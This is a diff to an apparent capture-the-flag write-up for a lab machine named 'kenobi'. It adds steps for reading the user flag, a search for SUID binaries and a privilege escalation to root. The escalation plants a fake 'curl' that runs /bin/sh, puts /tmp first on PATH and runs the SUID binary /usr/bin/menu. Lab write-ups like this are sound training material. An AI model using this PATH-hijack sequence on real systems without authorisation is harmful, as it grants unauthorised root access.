@@ -107,10 +107,13 @@ We can check the mount with this command:
 
 ![Screenshot_12](https://user-images.githubusercontent.com/80575736/111031404-c0d8c000-8407-11eb-8b56-2748574d03a5.png)
 
+10. We got it!! go to user home (/home/kenobi) and use this command ```cat``` to see the flag.
 
-10. To escalate privileges, we have to find SUID binaries, we can use this command to find them.
+![image](https://user-images.githubusercontent.com/80575736/111032309-d354f880-840b-11eb-9e37-50542840f4b5.png)
 
-``` find / -perm /4000 2>/dev/null ```
+11. To escalate privileges, we have to find SUID binaries, we can use this command to find them.
+
+```find / -perm /4000 2>/dev/null```
 
 ![Screenshot_19](https://user-images.githubusercontent.com/80575736/111031834-d0590880-8409-11eb-94cb-189f078ca9d1.png)
 
@@ -118,6 +121,26 @@ We can see a strange binary called "menu", with the path /usr/bin/menu, we can r
 With this command ```strings``` can looks for human readable strings on a binary.
 
 ![image](https://user-images.githubusercontent.com/80575736/111032041-cbe11f80-840a-11eb-8222-e2183e1e3dd1.png)
+
+
+12. Manipulate the path of victim machine to gain a root shell, executing this commands:
+
+```cd /tmp```
+
+```echo /bin/sh > curl```
+
+```chmod 777 curl```
+
+```export PATH=/tmp:$PATH```
+
+```/usr/bin/menu```
+
+![image](https://user-images.githubusercontent.com/80575736/111032521-f207bf00-840c-11eb-96fc-21c75d982413.png)
+
+We gain access with user root!!
+Go to /root and view the flag with command ```cat``` like in paragraph 10
+
+
 
 
 
